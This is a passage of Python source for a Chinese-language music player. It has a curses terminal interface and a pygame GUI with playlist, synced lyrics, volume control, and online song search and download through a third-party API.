                       player.Jump(f"{(x - bar_start) / (bar_end - bar_start) * float(music_time) - (pygame.mixer.music.get_pos()/1000 + flag):+.1f}")
                elif y == available_lines + 4 and len(" 音量: [") <= x <= len(" 音量: [") + (max_x - 45):
                       volume = (x - len(" 音量: [")) / (max_x - 45)
                       try:
                         pygame.mixer.music.set_volume(volume)
                       except Exception:
                         pass
             else:
               msg=f"未知坐标 {x}:{y}"
            elif bstate & curses.BUTTON3_CLICKED: msg="抱歉，暂不支持右键操作"
            need_redraw = True
        elif key in (ord("q"), ord("Q")):
            break
        elif key in (ord("a"), ord("A")):
            if auto_player:
              msg = "关闭自动播放"
              auto_player = False
            else:
              msg = "开启自动播放"
              auto_player = True
            need_redraw = True
        elif key == curses.KEY_UP and cursor > 0:
            cursor -= 1
            if cursor >= tmp_list_cursor + available_lines: tmp_list_cursor = cursor - available_lines + 1
            elif tmp_list_cursor > cursor: tmp_list_cursor=cursor + 1
            need_redraw = True
        elif key == curses.KEY_DOWN and cursor < len(files) - 1:
            cursor += 1
            if tmp_list_cursor > cursor: tmp_list_cursor=cursor
            elif cursor >= tmp_list_cursor + available_lines: tmp_list_cursor = cursor - available_lines
            need_redraw = True
        elif key == curses.KEY_HOME:
           if player.current_file:
             player.play(player.current_file)
             msg = "重新播放"
             need_redraw = True
        elif key == curses.KEY_END:
           if player.current_file:
             player.Jump(music_time)
             msg = "结束播放"
             time.sleep(0.15)
             need_redraw = True
        elif key == curses.KEY_LEFT:
            player.Jump("-5")
            need_redraw = True
        elif key == curses.KEY_RIGHT:
            player.Jump("+5")
            need_redraw = True
        elif key in (ord("n"), ord("N")):
            if len(files) > 0:
                cursor = (cursor + 1) % len(files)
                player.play(files[cursor])
                need_redraw = True
                msg = "下一首"
                if tmp_list_cursor > cursor: tmp_list_cursor=cursor
                elif cursor >= tmp_list_cursor + available_lines: tmp_list_cursor = cursor - available_lines
        elif key in (ord("p"), ord("P")):
            if len(files) > 0:
                cursor = (cursor - 1) % len(files)
                player.play(files[cursor])
                need_redraw = True
                msg = "上一首"
                if cursor >= tmp_list_cursor + available_lines: tmp_list_cursor = cursor - available_lines + 1
                elif tmp_list_cursor > cursor: tmp_list_cursor=cursor + 1
        elif key in (ord("r"), ord("R"), ord("d"), ord("D")):
            if key in (ord("d"), ord("D")):
               stdscr.addstr(available_lines + 5, 1, f"是否要删除: {files[cursor]} (y/n)",ERROR)
               stdscr.refresh()
               while True:
                   temp = stdscr.getch()
                   if temp in (ord("y"), ord("Y")):
                     try:
                       os.remove(files[cursor])
                       os.remove(os.path.splitext(files[cursor])[0] + ".lrc")
                       msg = "已删除"
                     except FileNotFoundError:
                       msg = "删除文件时出现异常"
                     break
                   elif temp in (ord("n"), ord("N"), 27) or temp == curses.KEY_MOUSE:
                       msg = "已取消"
                       break
            if msg == "\xE5\xB7\xB2\xE5\x8F\x96\xE6\xB6\x88": continue
            stdscr.clear()
            files = scan_music(MUSIC_DIR);tmp_list_cursor = 0;total = len(files)
            down = 0;idx = 0;cursor = 0
            need_redraw = True
            msg = "刷新文件"
        elif key in (ord("s"), ord("S")):
            player.stop()
            need_redraw = True
            msg = "停止音乐"
        elif key in (ord("+"), ord("=")):
            player.volume_up()
            need_redraw = True
            msg = "加大音量"
        elif key == ord("-"):
            player.volume_down()
            need_redraw = True
            msg = "减少音量"
        elif key in (curses.KEY_ENTER, 10, 13):
            player.play(files[cursor])
            need_redraw = True
            msg = "正在播放"
        elif key == ord(" "):
            player.toggle_pause()
            need_redraw = True
            msg = "暂停播放"
 orig_stdout = sys.stdout
 orig_stderr = sys.stderr
 devnull = open(os.devnull, 'w')
 sys.stdout = devnull
 sys.stderr = devnull
 try:               
  curses.wrapper(main)
 finally:
  sys.stdout = orig_stdout
  sys.stderr = orig_stderr
  devnull.close()
'''
 GUI - PYGAME
'''
def play_gui():
    print("\033[H\033[2J\033[3J")
    global GUI_MODE
    GUI_MODE = True
    def start(_): print(f"\033[1m[\033[35mSTART\033[0;1m]: \033[35m{_}\033[0m")
    def info(_):  print(f"\033[1m[\033[32mINFO\033[0;1m]: \033[32m{_}\033[0m")
    def warn(_):  print(f"\033[1m[\033[33mWARN\033[0;1m]: \033[33m{_}\033[0m")
    def err(_):   print(f"\033[1m[\033[31mERROR\033[0;1m]: \033[31m{_}\033[0m")
    def _hook(t, v, tb):
        err(f"{t.__name__}: {v}")
    sys.excepthook = _hook
    start("正在启动 GUI 版本，请稍后...")
    pygame.init()
    if pygame.mixer.get_init() is None: init_audio()
    W, H = 900, 640
    screen = pygame.display.set_mode((W, H))
    pygame.display.set_caption(WINDOW_TITLE)
    F_TITLE = pygame.font.Font(FONT_TITLE, F_TITLE_SIZE)
    F_NORM  = pygame.font.Font(FONT_NORM, F_NORM_SIZE)
    F_SMALL = pygame.font.Font(FONT_SMALL, F_SMALL_SIZE)
    if WINDOW_ICON:
        try:
            icon = pygame.image.load(WINDOW_ICON)
            pygame.display.set_icon(icon)
            info(f"图标已加载: {WINDOW_ICON}")
        except Exception as e:
            warn(f"图标加载失败: {e}")
    BG_IMAGE = None
    if BG_IMAGE_PATH:
        try:
            img = pygame.image.load(BG_IMAGE_PATH).convert()
            iw, ih = img.get_size()
            scale = max(W / iw, H / ih)
            nw, nh = int(iw * scale), int(ih * scale)
            img = pygame.transform.smoothscale(img, (nw, nh))
            x = (nw - W) // 2
            y = (nh - H) // 2
            BG_IMAGE = img.subsurface((x, y, W, H))
            info(f"背景图已加载: {BG_IMAGE_PATH}")
        except Exception as e:
            warn(f"背景图加载失败: {e}")
            BG_IMAGE = None

    DL_HEADERS = {
        "User-Agent": ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                       "AppleWebKit/537.36 (KHTML, like Gecko) "
                       "Chrome/126.0.0.0 Safari/537.36"),
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
    }
    DL_URI = "https://node.api.xfabe.com/api/wangyi/music?type=json&id="

    def fill_bg(s):
        if BG_IMAGE:
            s.blit(BG_IMAGE, (0, 0))
            if BG_DIM > 0:
                veil = pygame.Surface((W, H), pygame.SRCALPHA)
                veil.fill((0, 0, 0, BG_DIM))
                s.blit(veil, (0, 0))
        else:
            s.fill(C_BG)

    def panel_rect(s, x, y, w, h, base_color):
        surf = pygame.Surface((w, h), pygame.SRCALPHA)
        surf.fill((*base_color, PANEL_ALPHA))
        s.blit(surf, (x, y))

    class Btn:
        def __init__(self, x, y, w, h, text, color=None):
            self.rect = pygame.Rect(x, y, w, h)
            self.text = text
            self.hover = False
            self.color = color or C_BTN
        def draw(self, s):
            c = C_BTN_HOV if self.hover else self.color
            pygame.draw.rect(s, c, self.rect, border_radius=8)
            pygame.draw.rect(s, C_ACCENT2, self.rect, width=1, border_radius=8)
            t = F_SMALL.render(self.text, True, C_WHITE)
            s.blit(t, (self.rect.x + (self.rect.w - t.get_width()) // 2,
                       self.rect.y + (self.rect.h - t.get_height()) // 2))
        def hover_check(self, mx, my):
            self.hover = self.rect.collidepoint(mx, my)
        def hit(self, mx, my):
            return self.rect.collidepoint(mx, my)

    class Lrc:
        def __init__(self):
            self.t = []; self.x = []; self.has = False
        def load(self, path):
            self.t, self.x, self.has = [], [], False
            if not os.path.exists(path):
                return False
            try:
                a, b = local_lrc(path)
                self.t, self.x = a, b
                self.has = len(a) > 0 and len(a) == len(b)
            except Exception as e:
                warn(f"歌词加载失败: {e}")
            return self.has
        def idx(self, sec):
            if not self.t or sec < self.t[0]:
                return -1
            lo, hi = 0, len(self.t) - 1
            while lo < hi:
                mid = (lo + hi + 1) // 2
                if self.t[mid] <= sec:
                    lo = mid
                else:
                    hi = mid - 1
            return lo
        def win(self, sec, ctx=5):
            i = self.idx(sec)
            if i < 0:
                return []
            a = max(0, i - ctx)
            b = min(len(self.x), i + ctx + 1)
            return [(j, self.x[j], j == i) for j in range(a, b)]

    class Audio:
        def __init__(self):
            self.list = []
            self.idx = -1
            self.playing = False
            self.paused = False
            self.dur = 0.0
            self.flag = 0.0
            self.pause_pos = 0.0
            self.vol = 0.7
            self.lrc = Lrc()
            self.has_lrc = False
        def scan(self, folder):
            self.list.clear()
            exts = ('.mp3', '.wav', '.ogg', '.flac', '.m4a')
            try:
                for f in sorted(os.listdir(folder)):
                    if f.lower().endswith(exts):
                        self.list.append(os.path.join(folder, f))
            except FileNotFoundError:
                warn(f"目录不存在: {folder}")
            return len(self.list)
        def load(self, i):
            if not (0 <= i < len(self.list)):
                return
            self.idx = i
            p = self.list[i]
            pygame.mixer.music.load(p)
            pygame.mixer.music.play()
            pygame.mixer.music.set_volume(self.vol)
            try:
                self.dur = pygame.mixer.Sound(p).get_length()
            except Exception:
                self.dur = 0.0
            info(f"播放: {os.path.basename(p)}  时长: {self.dur:.2f}s")
            self.playing, self.paused, self.flag, self.pause_pos = True, False, 0.0, 0.0
            lp = os.path.splitext(p)[0] + ".lrc"
            self.has_lrc = self.lrc.load(lp)
            if self.has_lrc:
                info(f"歌词已加载: {len(self.lrc.t)} 行")
            else:
                warn(f"未找到歌词: {lp}")
        def toggle(self):
            if self.playing and not self.paused:
                self.pause_pos = self.real_now()
                pygame.mixer.music.pause()
                self.paused = True
                info("暂停")
            elif self.playing and self.paused:
                pygame.mixer.music.unpause()
                p = pygame.mixer.music.get_pos()
                self.flag = self.pause_pos - p / 1000.0
                self.paused = False
                info("继续")
            elif self.list:
                self.load(0)
        def stop(self):
            pygame.mixer.music.stop()
            self.playing, self.paused, self.flag, self.pause_pos = False, False, 0.0, 0.0
            info("停止播放")
        def nxt(self):
            if self.list:
                self.load((self.idx + 1) % len(self.list))
        def prv(self):
            if self.list:
                self.load((self.idx - 1) % len(self.list))
        def now(self):
            if not self.playing or self.paused:
                return self.pause_pos
            p = pygame.mixer.music.get_pos()
            return p / 1000.0 if p >= 0 else 0.0
        def real_now(self):
            if not self.playing or self.paused:
                return self.pause_pos
            return self.now() + self.flag
        def pct(self):
            return (self.real_now() / self.dur * 100) if self.dur > 0 else 0.0
        def seek(self, s):
            if self.dur <= 0:
                return
            s = max(0.0, min(s, self.dur))
            pygame.mixer.music.rewind()
            pygame.mixer.music.set_pos(s)
            p = pygame.mixer.music.get_pos()
            self.flag = s - p / 1000.0 if p >= 0 else s
            self.pause_pos = s
        def jump(self, o):
            if self.playing:
                self.seek(self.real_now() + o)
        def set_vol(self, v):
            self.vol = max(0.0, min(1.0, v))
            pygame.mixer.music.set_volume(self.vol)
        def ended(self):
            if self.playing and not self.paused:
                if not pygame.mixer.music.get_busy() and self.real_now() > 1:
                    self.nxt()

    def download_song(song_id, display_name):
        try:
            url = DL_URI + str(song_id)
            info(f"请求下载信息: id={song_id}")
            response = requests.get(url=url, headers=DL_HEADERS, timeout=10)
            music_data = response.json()
            d = music_data.get("data") or {}
            download_url = d.get("url") or d.get("download_url")
            real_id = d.get("id") or song_id
            info(f"返回码: {music_data.get('code')}  状态: {music_data.get('msg')}")
            if not download_url or download_url == "None":
                warn("无可用下载链接")
                return False
            fname = display_name.replace("/", "_").replace("\\", "_")
            base = str(MUSIC_DIR) if MUSIC_DIR.is_dir() else "."
            mp3_path = os.path.join(base, f"{fname}.mp3")
            lrc_path = os.path.join(base, f"{fname}.lrc")
            info(f"下载链接: {download_url}")
            download_file(download_url, mp3_path)
            info(f"音频已保存: {mp3_path}")
            music_lrc = get_music("lyrics", real_id, 1)
            if isinstance(music_lrc, str) and music_lrc.strip():
                with open(lrc_path, "w", encoding="utf-8") as f:
                    f.write(music_lrc)
                info(f"歌词已写入: {lrc_path}")
            else:
                warn(f"歌词为空，未写入: {lrc_path}")
            return True
        except Exception as e:
            err(f"下载失败: {e}")
            return False

    def fmt(ms):
        total_sec = int(ms) // 1000
        m, s = divmod(total_sec, 60)
        h, m = divmod(m, 60)
        if h:
            return f"{h:02d}:{m:02d}:{s:02d}"
        return f"{m:02d}:{s:02d}"

    def draw_bar(s, a):
        pygame.draw.rect(s, C_BAR_BG, (BAR_X, BAR_Y, BAR_W, BAR_H), border_radius=6)
        fw = int(BAR_W * a.pct() / 100)
        if fw > 0:
            pygame.draw.rect(s, C_BAR_FILL, (BAR_X, BAR_Y, fw, BAR_H), border_radius=6)
        dx, dy = BAR_X + fw, BAR_Y + BAR_H // 2
        pygame.draw.circle(s, C_WHITE, (dx, dy), 7)
        pygame.draw.circle(s, C_ACCENT, (dx, dy), 5)
        now_ms = a.now() * 1000
        end_ms = a.dur * 1000
        t1 = fmt(now_ms + a.flag * 1000)
        t2 = fmt(end_ms)
        s.blit(F_SMALL.render(f"{t1} / {t2}", True, C_TEXT), (BAR_X + BAR_W + 10, BAR_Y - 4))

    def list_scrollbar_rect(a, scroll):
        vis = LIST_H // 26
        total = len(a.list)
        if total <= vis:
            return None
        sx = LIST_X + LIST_W - 12
        sy = LIST_Y + 6
        sh = vis * 26
        return sx, sy, 6, sh, vis, total

    def draw_list(s, a, scroll):
        panel_rect(s, LIST_X, LIST_Y, LIST_W, LIST_H, C_PANEL)
        pygame.draw.rect(s, C_ACCENT2, (LIST_X, LIST_Y, LIST_W, LIST_H), width=1, border_radius=10)
        s.blit(F_NORM.render("播放列表", True, C_ACCENT), (LIST_X + 12, LIST_Y - 30))
        vis = LIST_H // 26
        for i in range(scroll, min(len(a.list), scroll + vis)):
            name = os.path.basename(a.list[i])
            if len(name) > 24:
                name = name[:22] + ".."
            r = pygame.Rect(LIST_X + 6, LIST_Y + 6 + (i - scroll) * 26, LIST_W - 18, 24)
            if i == a.idx:
                pygame.draw.rect(s, C_SEL, r, border_radius=5)
            c = C_ACCENT if i == a.idx else C_TEXT
            s.blit(F_SMALL.render(f"{i+1:02d}. {name}", True, c), (r.x + 8, r.y + 4))
        sb = list_scrollbar_rect(a, scroll)
        if sb:
            sx, sy, sw, sh, vis2, total = sb
            pygame.draw.rect(s, C_BAR_BG, (sx, sy, sw, sh), border_radius=3)
            thumb_h = max(20, int(sh * vis2 / total))
            thumb_y = sy + int((sh - thumb_h) * scroll / max(1, total - vis2))
            pygame.draw.rect(s, C_ACCENT, (sx, thumb_y, sw, thumb_h), border_radius=3)

    def draw_lyric(s, a):
        panel_rect(s, LYRIC_X, LYRIC_Y, LYRIC_W, LYRIC_H, C_PANEL)
        pygame.draw.rect(s, C_ACCENT2, (LYRIC_X, LYRIC_Y, LYRIC_W, LYRIC_H), width=1, border_radius=10)
        s.blit(F_NORM.render("歌词", True, C_ACCENT), (LYRIC_X + 12, LYRIC_Y - 30))
        if not a.has_lrc:
            t = F_NORM.render("暂无歌词", True, C_DIM)
            s.blit(t, (LYRIC_X + (LYRIC_W - t.get_width()) // 2, LYRIC_Y + LYRIC_H // 2 - 12))
            return
        rows = a.lrc.win(a.real_now(), 5)
        if not rows:
            return
        lh = 30
        sy = LYRIC_Y + (LYRIC_H - lh * len(rows)) // 2 + 10
        for i, (j, txt, cur) in enumerate(rows):
            ly = sy + i * lh
            if cur:
                pygame.draw.circle(s, C_ACCENT, (LYRIC_X + 18, ly + lh // 2), 4)
                c = C_ACCENT
                tx = LYRIC_X + 34
            else:
                d = abs(i - len(rows) // 2)
                g = max(70, 210 - d * 30)
                c = (g, g, g + 20)
                tx = LYRIC_X + 24
            s.blit(F_SMALL.render(txt, True, c), (tx, ly))

    def draw_vol(s, a):
        pygame.draw.rect(s, C_BAR_BG, (VOL_X, VOL_Y, VOL_W, 6), border_radius=3)
        fw = int(VOL_W * a.vol)
        pygame.draw.rect(s, C_ACCENT, (VOL_X, VOL_Y, fw, 6), border_radius=3)
        pygame.draw.circle(s, C_WHITE, (VOL_X + fw, VOL_Y + 3), 6)
        s.blit(F_SMALL.render(f"音量 {int(a.vol*100)}%", True, C_TEXT), (VOL_X, VOL_Y - 20))

    def draw_modal(s, title, lines, buttons, hover_states=None):
        mw, mh = 460, 200
        mx = (W - mw) // 2
        my = (H - mh) // 2
        overlay = pygame.Surface((W, H), pygame.SRCALPHA)
        overlay.fill((0, 0, 0, 150))
        s.blit(overlay, (0, 0))
        panel_rect(s, mx, my, mw, mh, C_PANEL2)
        pygame.draw.rect(s, C_ACCENT, (mx, my, mw, mh), width=2, border_radius=14)
        s.blit(F_NORM.render(title, True, C_ACCENT), (mx + 24, my + 20))
        for i, line in enumerate(lines):
            s.blit(F_SMALL.render(line, True, C_TEXT), (mx + 24, my + 60 + i * 26))
        btn_w, btn_h, gap = 120, 36, 20
        total = len(buttons) * btn_w + (len(buttons) - 1) * gap
        bx = mx + (mw - total) // 2
        by = my + mh - 56
        rects = []
        for i, (txt, col) in enumerate(buttons):
            r = pygame.Rect(bx + i * (btn_w + gap), by, btn_w, btn_h)
            hov = hover_states[i] if hover_states else False
            c = C_BTN_HOV if hov else (col or C_BTN)
            pygame.draw.rect(s, c, r, border_radius=8)
            pygame.draw.rect(s, C_ACCENT2, r, width=1, border_radius=8)
            t = F_SMALL.render(txt, True, C_WHITE)
            s.blit(t, (r.x + (r.w - t.get_width()) // 2, r.y + (r.h - t.get_height()) // 2))
            rects.append(r)
        return rects

    class SearchPanel:
        def __init__(self):
            self.open = False
            self.text = ""
            self.results = []
            self.cursor = 0
            self.scroll = 0
            self.max_visible = 7
            self.msg = ""
            self.caret_tick = 0
            self.busy = False
            self.drag_scroll = False
            self.limit = 30
            self.editing_limit = False
            self.limit_text = ""
            self.w, self.h = 720, 480
            self.x = (W - self.w) // 2
            self.y = (H - self.h) // 2
            self.input_rect = pygame.Rect(self.x + 24, self.y + 60, self.w - 48, 40)
            self.btn_clear = Btn(self.x + self.w - 480, self.y + self.h - 56, 100, 36,
                                 "清空", C_BTN)
            self.btn_limit = Btn(self.x + self.w - 360, self.y + self.h - 56, 100, 36,
                                 "阈值", C_BTN)
            self.btn_ok = Btn(self.x + self.w - 240, self.y + self.h - 56, 100, 36,
                              "搜索", C_ACCENT2)
            self.btn_cancel = Btn(self.x + self.w - 128, self.y + self.h - 56, 100, 36,
                                  "取消", C_DANGER)

        def ensure_visible(self):
            if self.cursor < self.scroll:
                self.scroll = self.cursor
            elif self.cursor >= self.scroll + self.max_visible:
                self.scroll = self.cursor - self.max_visible + 1

        def scrollbar_rect(self):
            if len(self.results) <= self.max_visible:
                return None
            sx = self.x + self.w - 16
            sy = self.y + 140
            sh = self.max_visible * 32
            return sx, sy, 6, sh

        def update_scroll_from_mouse(self, my):
            sb = self.scrollbar_rect()
            if not sb:
                return
            sx, sy, sw, sh = sb
            thumb_h = max(20, int(sh * self.max_visible / len(self.results)))
            travel = sh - thumb_h
            if travel <= 0:
                return
            rel = max(0.0, min(1.0, (my - sy - thumb_h / 2) / travel))
            self.scroll = int(rel * max(0, len(self.results) - self.max_visible))

        def clear(self):
            self.text = ""
            self.results = []
            self.cursor = 0
            self.scroll = 0
            self.msg = ""
            self.busy = False
            self.editing_limit = False
            self.limit_text = ""
            info("已清空搜索结果")

        def query(self):
            if not self.text.strip():
                warn("搜索关键词为空")
                self.msg = "请输入关键词"
                return
            info(f"搜索关键词: {self.text}  阈值: {self.limit}")
            self.msg = "搜索中..."
            self.busy = True
            try:
                r = get_music("search", self.text, self.limit)
                if isinstance(r, int) or r is None:
                    self.msg = "搜索失败"
                    self.results = []
                    warn("搜索失败")
                else:
                    names, artists, albums, durations, ids = r
                    self.results = []
                    for i in range(len(names)):
                        self.results.append({
                            "name": names[i],
                            "artist": artists[i],
                            "album": albums[i],
                            "duration": durations[i],
                            "id": ids[i],
                        })
                    self.msg = f"找到 {len(self.results)} 首"
                    info(f"搜索结果: {len(self.results)} 首")
            except Exception as e:
                err(f"搜索异常: {e}")
                self.msg = "搜索异常"
                self.results = []
            self.cursor = 0
            self.scroll = 0
            self.busy = False

        def pick(self):
            if not (self.results and self.cursor < len(self.results)):
                warn("未选中任何结果")
                return None
            return self.results[self.cursor]

        def draw(self, s, dt):
            overlay = pygame.Surface((W, H), pygame.SRCALPHA)
            overlay.fill((0, 0, 0, 140))
            s.blit(overlay, (0, 0))
            panel_rect(s, self.x, self.y, self.w, self.h, C_PANEL2)
            pygame.draw.rect(s, C_ACCENT, (self.x, self.y, self.w, self.h), width=2, border_radius=14)
            s.blit(F_NORM.render("在线搜索", True, C_ACCENT), (self.x + 24, self.y + 18))

            pygame.draw.rect(s, C_BG, self.input_rect, border_radius=8)
            pygame.draw.rect(s, C_ACCENT2, self.input_rect, width=1, border_radius=8)
            self.caret_tick += dt
            ts = F_SMALL.render(self.text, True, C_TEXT)
            tx = self.input_rect.x + 10
            ty = self.input_rect.y + (self.input_rect.h - ts.get_height()) // 2
            s.blit(ts, (tx, ty))
            if (self.caret_tick // 500) % 2 == 0:
                cx = tx + ts.get_width() + 1
                pygame.draw.line(s, C_ACCENT,
                                 (cx, self.input_rect.y + 8),
                                 (cx, self.input_rect.y + self.input_rect.h - 8), 2)

            s.blit(F_SMALL.render(self.msg, True, C_DIM), (self.x + 24, self.y + 112))

            ly = self.y + 140
            for k in range(self.scroll, min(len(self.results), self.scroll + self.max_visible)):
                item = self.results[k]
                i = k - self.scroll
                line = f"{k+1:02d}. {item['name']} - {item['artist']}  [{item['duration']}]"
                if len(line) > 46:
                    line = line[:44] + ".."
                r = pygame.Rect(self.x + 24, ly + i * 32, self.w - 48, 28)
                if k == self.cursor:
                    pygame.draw.rect(s, C_SEL, r, border_radius=6)
                s.blit(F_SMALL.render(line, True,
                                      C_ACCENT if k == self.cursor else C_TEXT),
                       (r.x + 8, r.y + 4))

            sb = self.scrollbar_rect()
            if sb:
                sx, sy, sw, sh = sb
                pygame.draw.rect(s, C_BAR_BG, (sx, sy, sw, sh), border_radius=3)
                thumb_h = max(20, int(sh * self.max_visible / len(self.results)))
                thumb_y = sy + int((sh - thumb_h) * self.scroll / max(1, len(self.results) - self.max_visible))
                pygame.draw.rect(s, C_ACCENT, (sx, thumb_y, sw, thumb_h), border_radius=3)

            has_pick = bool(self.results and self.cursor < len(self.results))
            self.btn_ok.text = "下载" if has_pick else "搜索"
            self.btn_ok.color = C_ACCENT if has_pick else C_ACCENT2
            self.btn_clear.draw(s)
            self.btn_limit.draw(s)
            self.btn_ok.draw(s)
            self.btn_cancel.draw(s)

            if self.editing_limit:
                lx, ly2 = self.x + 24, self.y + self.h - 120
                pygame.draw.rect(s, C_BG, (lx, ly2, 260, 36), border_radius=8)
                pygame.draw.rect(s, C_ACCENT, (lx, ly2, 260, 36), width=1, border_radius=8)
                s.blit(F_SMALL.render(f"搜索阈值: {self.limit_text}_", True, C_TEXT),
                       (lx + 10, ly2 + 9))

        def handle_event(self, event):
            if self.editing_limit:
                if event.type == pygame.KEYDOWN:
                    if event.key == pygame.K_ESCAPE:
                        self.editing_limit = False
                        info("取消修改阈值")
                        return True
                    elif event.key == pygame.K_RETURN:
                        try:
                            v = int(self.limit_text)
                            if 1 <= v <= 100:
                                self.limit = v
                                info(f"搜索阈值改为: {self.limit}")
                            else:
                                warn("阈值需在 1~100 之间")
                        except ValueError:
                            warn("阈值必须是整数")
                        self.editing_limit = False
                        return True
                    elif event.key == pygame.K_BACKSPACE:
                        self.limit_text = self.limit_text[:-1]
                        return True
                    elif event.unicode and event.unicode.isdigit():
                        self.limit_text += event.unicode
                        return True
                return True

            if event.type == pygame.KEYDOWN:
                if event.key == pygame.K_ESCAPE:
                    self.open = False
                    info("关闭搜索面板")
                    return True
                elif event.key == pygame.K_RETURN:
                    if self.results and self.cursor < len(self.results):
                        it = self.pick()
                        if it:
                            return ("download", it)
                    else:
                        self.query()
                    return True
                elif event.key == pygame.K_BACKSPACE:
                    self.text = self.text[:-1]
                    return True
                elif event.key == pygame.K_UP:
                    self.cursor = max(0, self.cursor - 1)
                    self.ensure_visible()
                    return True
                elif event.key == pygame.K_DOWN:
                    self.cursor = min(max(0, len(self.results) - 1), self.cursor + 1)
                    self.ensure_visible()
                    return True
                elif event.unicode and event.unicode.isprintable():
                    self.text += event.unicode
                    return True
            elif event.type == pygame.MOUSEWHEEL:
                if self.results:
                    self.scroll = max(0, min(max(0, len(self.results) - self.max_visible),
                                             self.scroll - event.y))
                return True
            elif event.type == pygame.MOUSEMOTION:
                mx, my = event.pos
                if self.drag_scroll:
                    self.update_scroll_from_mouse(my)
                    return True
                self.btn_clear.hover_check(mx, my)
                self.btn_limit.hover_check(mx, my)
                self.btn_ok.hover_check(mx, my)
                self.btn_cancel.hover_check(mx, my)
            elif event.type == pygame.MOUSEBUTTONDOWN:
                mx, my = event.pos
                sb = self.scrollbar_rect()
                if sb:
                    sx, sy, sw, sh = sb
                    if sx <= mx <= sx + sw and sy <= my <= sy + sh:
                        self.drag_scroll = True
                        self.update_scroll_from_mouse(my)
                        return True
                if self.btn_clear.hit(mx, my):
                    self.clear()
                    return True
                if self.btn_limit.hit(mx, my):
                    self.editing_limit = True
                    self.limit_text = str(self.limit)
                    info("修改搜索阈值")
                    return True
                if self.btn_ok.hit(mx, my):
                    if self.results and self.cursor < len(self.results):
                        it = self.pick()
                        if it:
                            return ("download", it)
                    else:
                        self.query()
                    return True
                if self.btn_cancel.hit(mx, my):
                    self.open = False
                    info("取消搜索")
                    return True
                if self.input_rect.collidepoint(mx, my):
                    return True
                for k in range(self.scroll, min(len(self.results), self.scroll + self.max_visible)):
                    i = k - self.scroll
                    r = pygame.Rect(self.x + 24, self.y + 140 + i * 32, self.w - 48, 28)
                    if r.collidepoint(mx, my):
                        self.cursor = k
                        return True
            elif event.type == pygame.MOUSEBUTTONUP:
                if self.drag_scroll:
                    self.drag_scroll = False
                    return True
            return False

    a = Audio()
    info(f"加载音乐目录: {MUSIC_DIR}")
    cnt = a.scan(MUSIC_DIR if MUSIC_DIR.is_dir() else Path("."))
    info(f"已加载 {cnt} 首歌曲")

    b_prev = Btn(60, 540, 90, 34, "上一首")
    b_play = Btn(160, 540, 90, 34, "播放")
    b_stop = Btn(260, 540, 90, 34, "停止")
    b_next = Btn(360, 540, 90, 34, "下一首")
    b_srch = Btn(460, 540, 90, 34, "搜索", C_ACCENT2)
    b_reload = Btn(560, 540, 80, 34, "刷新", C_BTN)
    b_del = Btn(650, 540, 80, 34, "删除", C_DANGER)
    buttons = [b_prev, b_play, b_stop, b_next, b_srch, b_reload, b_del]

    panel = SearchPanel()
    scroll = 0
    drag_p = drag_v = False
    drag_list_scroll = False

    downloading = {"active": False, "name": ""}
    deleting = {"active": False, "idx": -1, "hover": [False, False]}

    info("进入主循环")
    running = True
    clock = pygame.time.Clock()
    while running:
        dt = clock.tick(60)

        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                info("关闭窗口")
                running = False
                continue

            if deleting["active"]:
                mw, mh = 460, 200
                mx0 = (W - mw) // 2
                my0 = (H - mh) // 2
                btn_w, btn_h, gap = 120, 36, 20
                total = 2 * btn_w + gap
                bx = mx0 + (mw - total) // 2
                by = my0 + mh - 56
                r_yes = pygame.Rect(bx, by, btn_w, btn_h)
                r_no = pygame.Rect(bx + btn_w + gap, by, btn_w, btn_h)
                if event.type == pygame.MOUSEMOTION:
                    mx, my = event.pos
                    deleting["hover"][0] = r_yes.collidepoint(mx, my)
                    deleting["hover"][1] = r_no.collidepoint(mx, my)
                elif event.type == pygame.MOUSEBUTTONDOWN:
                    mx, my = event.pos
                    if r_yes.collidepoint(mx, my):
                        i = deleting["idx"]
                        if 0 <= i < len(a.list):
                            mp3 = a.list[i]
                            lrc = os.path.splitext(mp3)[0] + ".lrc"
                            try:
                                if os.path.exists(mp3):
                                    os.remove(mp3)
                                    info(f"删除音频: {mp3}")
                                else:
                                    warn(f"音频不存在: {mp3}")
                                if os.path.exists(lrc):
                                    os.remove(lrc)
                                    info(f"删除歌词: {lrc}")
                                else:
                                    warn(f"歌词不存在: {lrc}")
                            except Exception as e:
                                err(f"删除失败: {e}")
                            was_current = (i == a.idx)
                            a.scan(MUSIC_DIR if MUSIC_DIR.is_dir() else Path("."))
                            if was_current:
                                a.stop()
                            if a.idx >= len(a.list):
                                a.idx = len(a.list) - 1
                            scroll = 0
                        deleting["active"] = False
                        deleting["idx"] = -1
                    elif r_no.collidepoint(mx, my):
                        info("取消删除")
                        deleting["active"] = False
                        deleting["idx"] = -1
                continue

            if downloading["active"]:
                continue

            if panel.open:
                res = panel.handle_event(event)
                if res is True:
                    continue
                if isinstance(res, tuple) and res[0] == "download":
                    it = res[1]
                    downloading["active"] = True
                    downloading["name"] = f"{it['name']} - {it['artist']}"
                    continue

            if event.type == pygame.KEYDOWN:
                if event.key == pygame.K_ESCAPE:
                    running = False
                elif event.key == pygame.K_SPACE:
                    a.toggle()
                elif event.key == pygame.K_s:
                    a.stop()
                elif event.key == pygame.K_RIGHT:
                    a.jump(5); info(f"快进 5s -> {a.real_now():.1f}s")
                elif event.key == pygame.K_LEFT:
                    a.jump(-5); info(f"快退 5s -> {a.real_now():.1f}s")
                elif event.key == pygame.K_n:
                    a.nxt()
                elif event.key == pygame.K_p:
                    a.prv()
                elif event.key == pygame.K_UP:
                    a.set_vol(a.vol + 0.05)
                    info(f"音量: {int(a.vol*100)}%")
                elif event.key == pygame.K_DOWN:
                    a.set_vol(a.vol - 0.05)
                    info(f"音量: {int(a.vol*100)}%")
                elif event.key == pygame.K_f:
                    panel.open = True; panel.msg = ""; info("打开搜索面板")

            elif event.type == pygame.MOUSEBUTTONDOWN and not panel.open:
                mx, my = event.pos
                sb = list_scrollbar_rect(a, scroll)
                if sb:
                    sx, sy, sw, sh, vis2, total = sb
                    if sx <= mx <= sx + sw and sy <= my <= sy + sh:
                        drag_list_scroll = True
                        thumb_h = max(20, int(sh * vis2 / total))
                        travel = sh - thumb_h
                        if travel > 0:
                            rel = max(0.0, min(1.0, (my - sy - thumb_h / 2) / travel))
                            scroll = int(rel * max(0, total - vis2))
                        continue
                if b_prev.hit(mx, my):
                    a.prv()
